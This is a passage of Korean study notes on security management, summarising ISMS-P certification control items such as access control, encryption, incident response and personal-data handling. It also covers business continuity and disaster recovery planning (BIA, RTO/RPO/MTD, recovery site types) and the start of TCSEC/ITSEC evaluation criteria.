통제구역, 제한구역, 접견구역 등 물리적 보호구역을 지정하고 각 구역별 보호대책을 수립, 이행하여야 한다.   출입통제 : 보호구역은 인가된 사람만이 출입하도록 통제하고 책임추적성을 확보할 수 있도록 출입 및 접근 이력을 주기적으로 검토하여야 한다.   정보시스템 보호 : 정보시스템은 환경적 위협과 유해요소, 비인가 접근 가능성을 감소시킬 수 있도록 중요도와 특성을 고려하여 배치하고, 통신 및 전력 케이블이 손상을 입지 않도록 보호하여야 한다.   보호설비 운영 : 보호구역에 위치한 정보시스템의 중요도 및 특성에 따라, 온도,습도 조절, 화재 감지, 소화설비, 누수감지, UPS, 비상발전기, 이중전원선 등의 보호설비를 갖추고 운영절차를 수립,운영하여야 한다.   보호구역 내 작업 : 보호구역 내에서의 비인가행위 및 권한 오,남용 등을 방지하기 위한 작업 절차를 수립,이행하고, 작업 기록을 주기적으로 검토하여야 한다.   반출입 기기 통제 : 보호구역 내 정보시스템, 모바일 기기, 저장매체 등에 대한 반출입 통제절차를 수립,이행하고 주기적으로 검토하여야 한다.   업무환경 보안 : 공용으로 사용하는 사무용 기기(문서고, 공용 PC, 복합기, 파일서버 등) 및 개인 업무환경(업무용 PC, 책상 등)을 통해 개인정보 및 중요정보가 비인가자에게 노출 또는 유출되지 않도록 클린데스크, 정기점검 등 업무환경 보호대책을 수립, 이행하여야 한다.   5. 인증 및 권한관리     사용자 계정관리 : 정보시스템과 개인정보 및 중요정보에 대한 비인가 접근을 통제하고 업무 목적에 따른 접근권한을 최소한으로 부여할 수 있도록 사용자 등록, 해지 및 접근권한 부여,변경,말소 절차를 수립,이행하고, 사용자 등록 및 권한부여 시 사용자에게 보안책임이 있음을 규정화하고 인식시켜야 한다.   사용자 식별 : 사용자 계정은 사용자별로 유일하게 구분할 수 있도록 식별자를 할당하고 추측가능한 식별자 사용을 제한하여야 하며, 동일한 식별자를 공유하여 사용하는 경우 그 사유와 타당성을 검토하여 책임자의 승인 및 책임추적성 확보 등 보완대책을 수립, 이행하여야 한다.   사용자 인증 : 정보시스템과 개인정보 및 중요정보에 대한 사용자의 접근은 안전한 인증절차와 필요에 따라 강화된 인증방식을 적용하여야 한다. 또한 로그인 횟수 제한, 불법 로그인 시도 경고 등 비인가자 접근 통제방안을 수립,이행하여야 한다.   비밀번호 관리 : 법적 요구사항, 외부 위협요인 등을 고려하여 사용자(개안정보취급자, 관리자 등)및 정보주체(이용자)가 사용하는 비밀번호 관리절차를 수립,이행하여야 한다.   특수 계정 및 권한 관리 : 정보시스템 관리, 개인정보 및 중요정보 관리 등 특수 목적을 위하여 부여한 계정 및 권한을 최소한의 업무수행자에게만 부여하고 별도로 식별하여 통제하여야 한다.   접근권한 검토 : 정보시스템과 개인정보 및 중요정보에 접근하는 사용자 계정의 등록,이용,삭제 및 접근권한의 부여,변경,삭제 이력을 남기고 주기적으로 검토하여 적정성 여부를 점검하여야 한다.   6. 접근 통제     네트워크 접근 : 네트워크에 대한 비인가 접근을 통제하기 위하여 IP관리, 단말인증 등 관리절차를 수립,이행하고, 업무목적 및 중요도에 따라 네트워크 분리(DMZ, 서버팜, DB존, 개발존 등)와 접근 통제를 적용하여야 한다.   정보시스템 접근 : 서버, 네트워크시스템 등 정보시스템에 접근을 허용하는 사용자, 접근제한 방식, 안전한 접근수단 등을 정의하여 통제하여야 한다.   응용 프로그램 접근 : 사용자별 업무 및 접근 정보의 중요도 등에 따라 응용 프로그램 접근권한을 제한하고, 불필요한 정보 또는 중요정보 노출을 최소화 할수 있도록 기준을 수립하여 적용하여야 한다.   데이터베이스 접근 : 테이블 목록 등 데이터베이스 내에서 저장,관리되고 있는 정보를 식별하고, 정보의 중요도와 응용 프로그램 및 사용자 유형 등에 따른 접근 통제 정책을 수립,이행하여야한다.   무선 네트워크 접근 : 무선 네트워크를 사용하는 경우 사용자 인증, 송수신 데이터 암호화, AP 통제 등 무선 네트워크 보호대책을 적용하여야 한다. 또한 AD Hoc 접속, 비인가 AP 사용 등 비인가 무선 네트워크 접속으로부터 보호대책을 수립,이행하여야 한다.   원격접근 통제 : 보호구역 이외 장소에서의 정보시스템 관리 및 개인정보 처리는 원칙적으로 금지하고, 재택근무,장애대응,원격협업 등 불가피한 사유로 원격접근을 허용하는 경우 책임자 승인, 접근 단말 지정, 접근 허용범위 및 기간 설정, 강화된 인증, 구간 암호화, 접속단말 보안(백신, 패치 등) 등 보호대책을 수립,이행하여야 한다.   인터넷 접속 통제 : 인터넷을 통한 정보 유출, 악성코드 감염, 내부망 침투 등을 예방하기 위하여 주요 정보시스템, 주요 직무 수행 및 개인정보 취급 단말기 등에 대한 인터넷 접속 또는 서비스(P2P, 웹하드, 메신저 등)를 제한하는 등 인터넷 접속 통제 정책을 수립,이행하여야 한다.   7. 암호화 적용     암호정책 적용 : 개인정보 및 주요 정보 보호를 위하여 법적 요구사항을 반영한 암호화 대상, 암호강도, 암호 사용 정책을 수립하고 개인정보 및 주요 정보의 저장,전송,전달 시 암호화를 적용하여야 한다.   암호키 관리 : 암호키의 안전한 생성,이용,보관,배포,파기를 위한 관리 절차를 수립,이행하고, 필요 시 복구방안을 마련하여야 한다.   8. 정보시스템 도입 및 개발 보안     보안 요구사항 정의 : 정보시스템의 도입,개발,변경 시 정보보호 및 개인정보보호 관련 법적 요구사항, 최신 보안취약점, 안전한 코딩방법 등 보안 요구사항을 정의하고 적용하여야 한다.   보안 요구사항 검토 및 시험 : 사전 정의된 보안 요구사항에 따라 정보시스템이 도입 또는 구현되었는지를 검토하기 위하여 법적 요구사항 준수, 최신 보안취약점 점검, 안전한 코딩 구현, 개인정보 영향평가 등의 검토 기준과 절차를 수립,이행하고, 발견된 문제점에 대한 개선조치를 수행하여야 한다.   시험과 운영 환경 분리 : 개발 및 시험 시스템은 운영시스템에 대한 비인가 접근 및 변경의 위험을 감소시키기 위하여 원칙적으로 분리하여야 한다.   시험 데이터 보안 : 시스템 시험 과정에서 운영데이터의 유출을 예방하기 위하여 시험 데이터의 생성과 이용 및 관리, 파기, 기술적 보호조치에 관한 절차를 수립,이행하여야 한다.   소스 프로그램 관리 : 소스 프로그램은 인가된 사용자만이 접근할 수 있도록 관리하고, 운영환경에 보관하지 않는 것을 원칙으로 하여야 한다.   운영환경 이관 : 신규 도입,개발 또는 변경된 시스템을 운영환경으로 이관할 때는 통제된 절차를 따라야 하고, 실행코드는 시험 및 사용자 인수 절차에 따라 실행되어야 한다.   9. 시스템 및 서비스 운영관리     변경관리 : 정보시스템 관련 자산의 모든 변경내역을 관리할 수 있도록 절차를 수립,이행하고, 변경 전 시스템의 성능 및 보안에 미치는 영향을 분석하여야 한다.   성능 및 장애 관리 : 정보시스템의 가용성 보장을 위하여 성능 및 용량 요구사항을 정의하고 현황을 지속적으로 모니터링하여야 하며, 장애 발생 시 효과적으로 대응하기 위한 탐지,기록,분석,복구,보고 등의 절차를 수립,관리하여야 한다.   백업 및 복구 관리 : 정보시스템의 가용성과 데이터 무결성을 유지하기 위하여 백업 대상, 주기, 방법, 보관장소, 보관기간, 소산 등의 절차를 수립,이행하여야 한다. 아울러 서고 발생 시 적시에 복구할 수 있도록 관리하여야 한다.   로그 및 접속기록 관리 : 서버, 응용프로그램, 보안 시스템, 네트워크 시스템 등 정보시스템에 대한 사용자 접속기록, 시스템로그, 권한부여 내역 등의 로그유형, 보존기간, 보존방법 등을 정하고 위,변조, 도난, 분실 되지 않도록 안전하게 보존,관리하여야 한다.   로그 및 접속기록 점검 : 정보시스템의 정상적인 사용을 보장하고 사용자 오,남용(비인가접속, 과다조회)을 방지하기 위하여 접근 및 사용에 대한 로그 검토기준을 수립하여 주기적으로 점검하여, 문제 발생 시 사후조치를 적시에 수행하여야 한다.   시간 동기화 : 로그 및 접속기록의 정확성을 보장하고 신뢰성 있는 로그분석을 위하여 관련 정보시스템의 시각을 표준시각으로 동기화하고 주기적으로 관리하여야 한다.   정보자산의 재사용 및 폐기 : 정보자산의 재사용과 폐기 과정에서 개인정보 및 중요정보가 복구,재생되지 않도록 안전한 재사용 및 폐기 절차를 수립,이행하여야 한다.   10. 시스템 및 서비스 보안관리     보안 시스템 운영 : 보안시스템 유형별로 관리자 지정, 최신 정책 업데이트, 룰셋 변경, 이벤트 모니터링 등의 운영절차를 수립,이행하고 보안시스템별 정책적용 현황을 관리하여야 한다.   클라우드 보안 : 클라우드 서비스 이용 시 서비스 유형(SaaS,PaaS,IaaS 등)에 따른 비인가 접근, 설정 오류 등에 따라 중요정보와 개인정보가 유,노출되지 않도록 관리자 접근 및 보안 설정 등에 대한 보호대책을 수립,이행하여야 한다.   공개서버 보안 : 외부 네트워크에 공개되는 서버의 겨우 내부 네트워크와 분리하고 취약점 점검, 접근 통제, 인증, 정보 수집,저장,공개 절차 등 강화된 보호대책을 수립,이행하여야 한다.   전자거래 및 핀테크 보안 : 전자거래 및 핀테크 서비스 제공 시 정보유출이나 데이터 조작,사기 등의 침해사고 예방을 위한 인증,암호화 등의 보호대책을 수립하고, 결제시스템 등 외부 시스템과 연계할 경우 안전성을 점검하여야 한다.   정보전송 보안 : 타 조직에 개인정보 및 중요정보를 전송할 경우 안전한 전송 정책을 수립하고 조직 간 합의를 통해관리 책임, 전송방법, 개인정보 및 중요정보 보호를 위한 기술적 보호조치 등을 협약하고 이행하여야 한다.   업무용 단말기 보안 : PC, 모바일 기기 등 단말기기를 업무 목적으로 네트워크에 연결할 경우 기기 인증 및 승인, 접근 범위, 기기 보안설정 등의 접근 통제 대책을 수립하고 주기적으로 점검하여야 한다.   보조저장매체 관리 : 보조저장매체를 통하여 개인정보 또는 중요정보의 유출이 발생하거나 악성코드가 감염되지 않도록 관리 절차를 수립,이행하고, 개인정보 또는 중요정보가 포함된 보조저장매체는 안전한 장소에 보관하여야 한다.   패치관리 : 소프트웨어, 운영체제, 보안시스템 등의 취약점으로 인한 침해사고를 예방하기 위하여 최신 패치를 적용하여야 한다. 다만 서비스 영향을 검토하여 최신 패치 적용이 어려울 경우 책임자 승인과 보완대책 수립 등의 절차를 이행하여야 한다.   악성코드 통제 : 바이러스,웜,트로이목마,랜섬웨어 등의 악성코드로부터 개인정보 및 중요정보, 정보시스템 및 업무용 단말기 등을 보호하기 위하여 악성코드 예방,탐지,대응 등의 보호대책을 수립,이행하여야 한다.   11. 사고 예방 및 대응     사고 예방 및 대응체계 구축 : 침해사고 및 개인정보 유출 등을 예방하고 사고 발생 시 신속하고 효과적으로 대응할 수 있도록 내,외부 침해시도의 탐지,대응,분석 및 공유를 위한 체계와 절차를 수립하고, 관련 외부기관 및 전문가들과 협조체계를 구축하여야 한다.   취약점 점검 및 조치 : 정보시스템의 취약점이 노출되어 있는지를 확인하기 위하여 정기적으로 취약점점검을 수행하고 발견된 취약점에 대해서는 신속하게 조치하여야 한다. 또한 최신 보안취약점의 발생 여부를 지속적으로 파악하고 정보시스템에 미치는 영향을 분석하여 조치하여야 한다.   이상행위 분석 및 모니터링 : 내,외부에 의한 침해시도, 개인정보유출 시도, 부정행위 등을 신속하게 탐지,대응할 수 있도록 네트워크 및 데이터 흐름 등을 수집하여 분석하며, 모니터링 및 점검 결과에 따른 사후조치는 적시에 이루어져야 한다.   사고 대응 훈련 및 개선 : 침해사고 및 개인정보 유출사고 대응 절차를 임직원과 이해관계자가 숙지하도록 시나리오에 따른 모의훈련을 연 1회 이상 실시하고 훈련결과를 반영하여 대응체계를 개선하여야 한다.   사고 대응 및 복구 : 침해사고 및 개인정보 유출 징후나 발생을 인지한 때에는 법적 통지 및 신고 의무를 준수하여야 하며, 절차에 따라 신속하게 대응 및 복구하고 사고분석 후 재발방지 대책을 수립하여 대응체계에 반영하여야 한다.   12. 재해복구     재해,재난 대비 안전조치 : 자연재해, 통신,전력 장애, 해킹 등 조직의 핵심 서비스 및 시스템의 운영 연속성을 위협할 수 있는 재해 유형을 식별하고 유형별 예상 피해규모 및 영향을 분석하여야 한다. 또한 복구 목표시간, 복구 목표시점을 정의하고 복구 전략 및 대책, 비상시 복구 조직, 비상연락체계, 복구 절차 등 재해 복구체계를 구축하여야 한다.   재해 복구 시험 및 개선 : 재해 복구 전략 및 대책의 적정성을 정기적으로 시험하여 시험결과, 정보시스템 환경변화, 법규 등에 따른 변화를 반영하여 복구전략 및 대책을 보완하여야 한다.   3. 개인정보 처리 단계별 요구사항  1. 개인정보 수집 시 보호조치     읽어보기   개인정보 수집제한 : 개인정보는 서비스 제공을 위하여 필요한 최소한의 정보를 적법하고 정당하게 수집하여야 하며, 필수정보 이외의 개인정보를 수집하는 경우에는 선택 항목으로 구분하여 해당 정보를 제공하지 않는다는 이유로 서비스 제공을 거부하지 않아야 한다.   개인정보의 수집 동의 : 개인정보는 정보주체(이용자)의 동의를 받거나 관계 법령에 따라 적법하게 수집하여야 하며, 만 14세 미만 아동의 개인정보를 수집하려는 경우에는 법정대리인의 동의를 받아야 한다.   주민등록번호 처리 제한 : 주민등록번호는 법적 근거가 있는 경우를 제외하고는 수집,이용 등 처리할 수 없으며, 주민등록번호의 처리가 허용된 경우라 하더라도 인터넷 홈페이지 등에서 대체수단을 제공하여야 한다.   민감정보 및 고유식별정보의 처리 제한 : 민감정보와 고유식별정보(주민등록번호 제외)를 처리하기 위해서는 법령에서 구체적으로 처리를 요구하거나 허용하는 경우를 제외하고는 정보주체(이용자)의 별도 동의를 받아야 한다.   간접수집 보호조치 : 정보주체(이용자) 이외로부터 개인정보를 수집하거나 제공받는 경우에는 업무에 필요한 최소한의 개인정보만 수집,이용하여야 하고 법령에 근거하거나 정보주체(이용자)의 요구가 있으면 개인정보의 수집 출처, 처리목적, 처리정지의 요구권리를 알려야 한다.   영상정보처리기기 설치,운영 : 영상정보처리기기를 공개된 장소에 설치,운영하는 경우 설치 목적 및 위치에 따라 법적 요구사항(안내판 설치 등)을 준수하고, 적절한 보호대책을 수립,이행하여야 한다.   홍보 및 마케팅 목적 활용 시 조치 : 재화나 서비스의 홍보, 판매 권유, 광고성 정보전송 등 마케팅 목적으로 개인정보를 수집, 이용하는 경우에는 그 목적을 정보주체(이용자)가 명확하게 인지할 수 있도록 고지하고 동의를 받아야 한다.   2. 개인정보 보유 및 이용 시 보호조치     읽어보기   개인정보 현황관리 : 수집,보유하는 개인정보의 항목, 보유량, 처리 목적 및 방법, 보유기간 등 현황을 정기적으로 관리하여야 하며, 공공기관의 경우 이를 법률에서 정한 관계기관의 장에게 등록하여야 한다.   개인정보 품질보장 : 수집된 개인정보는 처리 목적에 필요한 범위에서 개인정보의 정확성, 완전성, 최신성이 보장되도록 정보주체(이용자)에게 관리절차를 제공하여야 한다.   개인정보 표시제한 및 이용시 보호조치 : 개인정보의 조회 및 출력(인쇄, 화면표시, 파일생성 등)시 용도를 특정하고 용도에 따라 출력 항목 최소화, 개인정보 표시제한, 출력물 보호조치 등을 수행하여야 한다. 또한 빅데이터 분석, 테스트 등 데이터 처리 과정에서 개인정보가 과도하게 이용되지 않도록 업무상 반드시 필요하지 않은 개인정보는 삭제하거나 또는 식별할 수 없도록 조치하여야 한다.   이용자 단말기 접근 보호 : 정보주체(이용자)의 이동통신단말장치 내에 저장되어 있는 정보 및 이동통신단말장치에 설치된 기능에 접근이 필요한 경우 이를 명확하게 인지할 수 있도록 알리고 정보주체(이용자)의 동의를 받아야 한다.   개인정보 목적외 이용 및 제공 : 개인정보는 수집 시의 정보주체(이용자)에게 고지,동의를 받은 목적 또는 법령에 근거한 범위 내에서만 이용 또는 제공하여야 하며, 이를 초과하여 이용,제공하려는 때에는 정보주체(이용자)의 추가 동의를 받거나 관계 법령에 따른 적법한 경우인지 확인하고 적절한 보호대책을 수립,이행하여야 한다.   3. 개인정보 제공 시 보호조치     읽어보기   개인정보 제3자 제공 : 개인정보를 제3자에게 제공하는 경우 법적 근거에 의하거나 정보주체(이용자)의 동의를 받아야 하며, 제3자에게 개인정보의 접근을 허용하는 등 제공 과정에서 개인정보를 안전하게 보호하기 위한 보호대책을 수립,이행하여야 한다.   업무 위탁에 따른 정보주체 고지 : 개인정보 처리업무를 제3자에게 위탁하는 경우 위탁하는 업무의 내용과 수탁자 등 관련사항을 정보주체(이용자)에게 알려야 하며, 필요한 경우 동의를 받아야 한다.   영업의 양수 등에 따른 개인정보의 이전 : 영업의 양도,합병 등으로 개인정보를 이전하거나 이전받는 경우 정보주체(이용자) 통지 등 적절한 보호조치를 수립,이행하여야 한다.   개인정보의 국외이전 : 개인정보를 국외로 이전하는 경우 국외 이전에 대한 동의, 관련 사항에 대한 공개 등 적절한 보호조치를 수립,이행하여야 한다.   4. 개인정보 파기 시 보호조치     읽어보기   개인정보의 파기 : 개인정보의 보유기간 및 파기 관련 내부 정책을 수립하고 개인정보의 보유기간 경과, 처리목적 달성 등 파기 시점이 도달한 때에는 파기의 안전성 및 완전성이 보장될 수 있는 방법으로 지체 없이 파기하여야 한다.   처리목적 달성 후 보유 시 조치 : 개인정보의 보유기간 경과 또는 처리목적 달성 후에도 관련 법령 등에 따라 파기하지 아니하고 보존하는 경우에는 해당 목적에 필요한 최소한의 항목으로 제한하고 다른 개인정보와 분리하여 저장,관리하여야 한다.   휴면 이용자 관리 : 서비스를 일정기간 동안 이용하지 않은 휴면 이용자의 개인정보를 보호하기 위하여 관련 사항의 통지, 개인정보의 파기 또는 분리보관 등 적절한 보호조치를 이행하여야 한다.   5. 정보주체 권리보호     읽어보기   개인정보처리방침 공개 : 개인정보의 처리 목적 등 필요한 사항을 모두 포함하여 개인정보처리방침을 수립하고, 이를 정보주체(이용자)가 언제든지 쉽게 확인할 수 있도록 적절한 방법에 따라 공개하고 지속적으로 현행화하여야 한다.   정보주체 권리보장 : 정보주체(이용자)가 개인정보의 열람, 정정,삭제, 처리정지, 이의제기, 동의철회 요구를 수집 방법,절차보다 쉽게 할 수 있도록 권리행사 방법 및 절차를 수립,이행하고, 정보주체(이용자)의 요구를 받은 경우 지체 없이 처리하고 관련 기록을 남겨야 한다. 또한 이용자의 사생활 침해, 명예훼손 등 타인의 권리를 침해하는 정보가 유통되지 않도록 삭제 요청, 임시조치 등의 기준을 수립,이행하여야 한다.   이용내역 통지 : 개인정보의 이용내역 등 정보주체(사용자)에게 통지하여야 할 사항을 파악하여 그 내용을 주기적으로 통지하여야 한다.   6. 보완조치 기한     인증심사에서 발견된 결함을 보완조치를 수행해야 하며 보완조치는 40일 이내 완료해야 한다. 그리고 재조치는 60일까지 가능하다. 그러므로 최대 100일내에 보완조치를 완료해야 한다.   업무 연속성 계획 및 재난복구 계획  1. 재해(Disaster)의 개념     재해(Disaster)의 특성            낮은 발생 가능성, 치명적인 결과, 불확실성       재해는 일상적이지 않으나 그 피해가 크며 기업의 취약성은 점차 증가하고 있음                재해 발생원인에 따른 분류                                  분류           세부 항목                                           자연적(Natural)           화재, 지진, 태풍, 홍수 등                             인적(Human)           조작 에러, 폭격, 테러, 방화, 해킹 등                             환경적(Environmental)           기술적인 재해, 장비 고장, SW 에러, 통신, 네트워크 중단, 전력 중단                           2. BCP(Business Continuity Planning) : 비즈니스 전체에 대한 연속성  1. BCP(사업 연속성 계획)     비상시에도 기업의 존립을 유지하기 위한 프로세스를 정의한 복구 절차   업무의 중단 상황과 이후 비즈니스 운영의 연속성을 위한 계획   가장 핵심적인 비즈니스 기능들의 우선순위화된 재개에 초점   2.BCP의 특징     업무의 심각한 중단 상황과 그 이후의 업무 기능 및 업무 프로세스를 지원하는 IT 시스템의 유지를 다룸 (During and after a significant disruption)   재해복구 계획, 업무 재개 계획, 주거자 비상 계획 등을 포함할 수도 있음   BCP 내의 책임 추적성과 우선순위는 운영 연속성 계획(COOP)내의 책임 추적성과 우선순위와 가능한 충돌을 제거하기 위하여 조정되어야 함.   3. BCP 주요 활동                  구분       특징       사례                       위험분석(Risk Analysis)       위험개념 정립, 위험대비 필요성 및 위험분석       전산장애, 재해분석, 사례분석                 피해분석(Impact Analysis)       전산 업무장애, 재해로 발생 가능한 피해종류 파악       간접적, 직접적 총괄적 피해                 업무 중요도 산정       장기적 재해 시 우선 복구할 업무의 중요도 산정, 산정 기준       중요도 계량화, 업무별 등급화           4. BCP 절차                  단계       설명                       1.연속성 계획 정책 선언서 개발       ⦁ BCP 개발, 임무수행 역할에 관한 권한 할당의 가이드라인을 제공하는 정책을 기술 ⦁ 법규 요구사항 통합, 영역/목표/역할 정의, 관리진의 정책 승인                 2. BIA(Business Impact Analysis) 수행       ⦁ 핵심 기능/시스템 식별, 핵심 기능 관련 요구자산 식별 ⦁ 중단 영향과 허용 가능한 정지시간 확인 ⦁ 자원의 RTO 계산, 위협식별, 위험 계량화, 백업솔루션 확인                 3. 예방통제 식별       ⦁ 위협이 식별되면 경제적 방법으로 조직 내 위험 Level을 감소시키기 위한 통제와 대응책을 식별하고 구현 ⦁ 통제 구현, 위험 완화                 4. 복구전략 개발       ⦁ 시스템과 중대한 기능들이 온라인으로 즉시 옮겨질 것을 보장하는 방법들을 공식화 ⦁ 업무 프로세스, 시설, 지원과 기술, 사용자 및 사용자 환경, 데이터                 5. 연속성 계획 개발       ⦁ 장애 상황에서의 업무 기능 수행 방법에 관한 절차와 가이드라인을 기술 ⦁ 절차, 복구 솔루션, 임무와 역할, 비상 대응                 6. 계획, 테스트 및 훈련       ⦁ BCP 내의 부족한 것을 발견하기 위하여 계획을 테스트하고 기대된 임무상의 개별 요소를 적절히 준비시키기 위한 훈련 수행 ⦁ 테스트 계획, 계획 개선, 직원 훈련                 7. 계획의 유지 관리       ⦁ BCP는 살아있는 문서이며 정규적으로 업데이트 된다는 것을 보장 ⦁ 변화 통제 프로세스에 통합, 책임 할당, 계획 업데이트           3. DRP(Disaster Recovery Planning)  1. DRP(재해복구 계획)     비상 환경에서 기업의 존립을 유지하기 위해 필수적인 IT 자원에 대한 복구 절차   2. DRP 특징     비상 사태에 따른 대체 사이트에서의 목표 시스템, 응용 프로그램, 컴퓨터 설비의 운영 재개와 같은 IT 중심 계획   DRP 영역은 IT Contingency Plan과 중복될 수도 있으나 DRP는 좁은 범위로서 배치전환을 요구하지 않는 소규모 업무 중단 사태는 다루지 않음 (즉, DRP 핵심 IT를 다루며 배치전환이 필요함)   조직의 필요에 따라 여러 개의 DRP(예:화재 DRP, 수해 DRP)가 BCP에 추가되기도 함   3. BCP와 DRP의 차이점 및 공통점     공통점            일부 예방적(예:위험 회피)인 성격이 있으나 교정 통제로 분류       위험 수용, 가용성 확보 목적, 잔여 위험을 대상으로 함(대외비로 관리)           차이점            BCP : 사업 활동이나 프로세스가 중단되는 것에 대한 대응       DRP : 핵심 IT 시스템과 데이터가 중단되는 것에 대한 대응           4. 비상계획 형태                  관점       계획       목적       영역                       업무       Business Continuity Plan(BCP)       심각한 중단 사태로부터 복구되는 동안 필수 업무 운영 유지를 위한 절차 제공       ⦁ 업무 프로세스를 다룸 ⦁ IT는 업무 지원에 한함                         Business Recovery(or Resumption) Plan(BRP)       재해 발생 후 즉각적인 업무 운영의 복구에 관한 절차 제공       ⦁ 업무 프로세스를 다룸 ⦁ IT는 업무 지원에 한함                         Continuity Of Operation Plan(COOP)       조직의 필수적/전략적 기능을 대체 사이트에서 30일 이상 유지하기 위한 절차와 능력을 제공       ⦁ 가장 치명적으로 여겨지는 조직 임무의 부분을 다룸 ⦁ 본부 레벨에서 작성                 IT       Disaster Recovery Plan(DRP)       대체 사이트에서의 복구 능력을 촉진하기 위한 상세한 절차 제공       ⦁ 정보시스템 대상 ⦁ 장시간에 걸친 중대한 중단 사태에 한함                         IT Contingency Plan/Continuity Of Support Plan       중요한 응용 또는 일반적인 지원 시스템의 복구를 위한 절차와 능력 제공       ⦁ IT시스템 중단 사태를 다룸 ⦁ 업무 프로세스는 비초점                 보안       Cyber Incident Response Plan(CIRP)       악성 사이버 사건의 탐지/대응/확산 방지에 대한 절차 제공       시스템/네트워크에 관한 정보보안 대응 초점                 인명,자산       Occupant Emergency Plan(OEP)       물리적 위협에 대응하는 동안 인명의 최소화와 자산 충격 보호를 위한 통합 절차       ⦁ 인명, 자산 ⦁ 업무/IT 기능에 기초하지 않음                 신뢰       Crisis Communication Plan(CCP)       현 상황을 개선, 주주, 공적 기관에 알리는 절차를 제공       신뢰유지, 투명한 보도 절차, IT는 비초점           4. 사업영향분석(BIA, Business Impact Analysis)  1. 정의     BIA는 BCP에서 가장 중요한 활동으로 BIA의 궁극적인 목표는 비즈니스별로 위험을 분석해서 복구(Recovery) 목표를 수립하는 것임   업무 중단이 사업에 미치는 영향에 대한 정성적/정량적 분석 및 평가임   2. BIA 복구 목표 수립      업무영향 분석을 통해서 업무별 복구시간 목표산정, 재해 시 업무 우선순위 파악, 업무 간 상호 연관성 분석을 수행해서 재해복구 목표를 설정   이 설정을 달성하기 위해 정보시스템으로 재해복구시스템(DRS)을 구축할 수 있고, 재해복구시스템의 유형도 결정함   3. BIA 특징                  목적       주요 내용                       업무 프로세스 우선순위 결정       ⦁ 주요 업무 프로세스의 식별 ⦁ 재해 유형 식별 및 재해 발생 가능성과 업무 중단의 지속시간 평가 ⦁ 업무 프로세스별 중요도 평가 ⦁ 정성적 정량적 영향도 분석                 중단 가능시간 산정       ⦁ 업무 프로세스별 지연 감내 시간 산정 ⦁ 업무 복구 목표시간 RTO, 업무 복구 목표시점 RPO 산정                 자원 요건 산정       연속성 보장 위해 어떤 자원이 필요한지 산정           4. BIA 주요 활동     핵심 업무 프로세스와 Workflow를 식별(설문조사, 사용자 참여를 통해)함   자원 요구사항 식별 : 핵심 프로세스에 필요한 자원을 식별   업무 중단으로 인한 영향의 정성적, 정량적 평가 및 위험분석   최대 허용 유휴시간(MTD : Maximum Tolerable Downtime)을 산정   우선순위를 결정(고위 경영진 결정하며 복구전략 개발 시 참조)   위원회는 식별된 위협을 아래 사항과 매핑   고위 경영진과 사용자의 참여가 중요   최대 허용 유휴시간, 재정적인 고려사항, 법적 책임과 성명, 운영 중단과 생산력을 고려   5. BIA 단계                  단계       주요 활동                       1       데이터 수집을 위한 인터뷰 대상자 선정                 2       데이터 수집 방법 결정(조사, 설명, 워크숍 등, 정성적/정량적 접근 방법)                 3       회사의 핵심 업무 기능 식별                 4       핵심 업무 기능이 의존하는 IT 자원의 식별                 5       IT 자원이 없을 경우의 핵심업무 기능 생존 기간 산정                 6       핵심 업무 기능에 관련된 취약점과 위협 식별                 7       개별적 업무 기능에 대한 위험 산정                 8       발견사항을 문서화하고 경영자에게 제출           6. 복구 전략 수립     개요            BIA는 모든 구성요소의 복구 전략 청사진을 제공한다.       BCP 위원회는 BIA에서 식별된 위험에 대한 복구 전략을 비용효과 분석을 통해 발견해야 한다.       사업 지속을 위한 복구 전략의 정의 및 문서화, 장애 시 대체 운영을 위한 대응 전략이다.       세분화 : 업무 프로세스 복구, 시설 복구, 지원 및 기술 복구, 사용자 환경 복구, 데이터 복구                재해복구 수준별 유형 핵심 지표                                  지표           설명                                           RPO           ⦁ Recovery Point Objective (복구 목표 시점) ⦁ 재해시점으로부터 Data Backup을 해야 하는 시점까지의 시간 ⦁ RPO=0의 의미 : Mirroring, 고장 시점 복구 전략                             RTO           ⦁ Recovery Time Objective (복구 목표 시간) ⦁ 재해 후 시스템, 응용, 기능들이 반드시 복구되어야 하는 시간                             RP           Recovery Period (실제 복구 시간) : 실제 업무 기능 복구까지 걸린 시간                             MTD           ⦁ Maximum Tolerable Downtime (용인 가능 최대 정지 시간) ⦁ 치명적인 손실 없이 조직이 중단/재해 영향을 견딜 수 있는 최대 시간 ⦁ MTD = RTO + WRT (Work Recovery Time, 업무 복구 시간) ⦁ “MTD가 짧다”의 의미 : 중요 자산, 빠른 복구 필요, 높은 비용                             SDO           Service Delivery Objective : 2차 사이트에서 제공하는 업무 용량                           7. RTO, RPO, MTD, RP      이미지 출처      RTO            재해 시 복구 목표시간의 선정       구축비용에 반비례       재해 시 발생 손실에 비례           RPO            업무 중단 시점부터 데이터가 복구되어 다시 정상가동 될 때까지의 시간       데이터가 복구되어야 하는 시점           MTD(최대 허용 유휴시간) 산정            업무가 회복할 수 없는 손실을 입지 않도록 업무 기능이 중단될 수 있는 최대 시간                MTD, RTO, RP 관계              이미지 출처       RTO 및 RPO에 따른 재해복구시스템 유형 결정            RPO = 0 &amp; RTO = 0 : Mirror Site       RPO = 0 &amp; RTO &lt; 수 시간 : Hot Site       RPO, RTO가 약 1일 : Warm Site       RPO, RTO가 수일 ~ 수주 : Cold Site           8. 재해복구 시스템의 종류                  사이트       목표 복구       장점       단점                       Mirror       0~수분       ⦁ 1차 사이트와 완전 이중화 수행, 데이터베이스 실시간 동기화 ⦁ Active-Active 상태로 유지       고비용, 상시 검토                 Hot       24시간 내       ⦁ 고가용성, 데이터 최신성 ⦁ Active-Standby 서버로 구성       DB 복구 필요                 Warm       수 일 내       ⦁ 핫사이트로 전환이 용이 ⦁ 중요한 업무 위주로만 백업 사이트를 구성       시스템 확보 필요                 Cold       수 주 내       ⦁ 저렴, 데이터만 백업 ⦁ 전기 시설만 완비하고 재해 발생 시 서버와 소프트웨어를 구매해서 복구       시간이 가장 오래 걸림              Availability = MTBF / (MTBF + MTTR)   MTBF : 평균 고장 간격 시간   MTTR : 평균 수리 시간   정보보호 시스템 인증     정보보호 시스템 제품을 객관적으로 평가하여 정보보호 제품의 신뢰성을 향상시키려는 인증제도   침입차단시스템, 침입탐지시스템, VPN 등이 해당   1. TCSEC 인증 및 ITSEC 인증  1. TCSEC     Trusted Computer System Evaluation Criteria, Orange Book   독립적인 시스템(OS, 제품)을 평가하며 Orange-book 이라고 함.   BLP(Bell-LaPadula) 모델에 기반하여 기밀성만 강조함.   핵심 : 보안 요구사항을 정의하고 정보 조달 요구사항을 표준화하는 것   기능성과 보증을 구분하지 않고 평가하며 최초의 체계적이고 논리적인 표준   2. ITSEC     Information Technology Security Evaluation 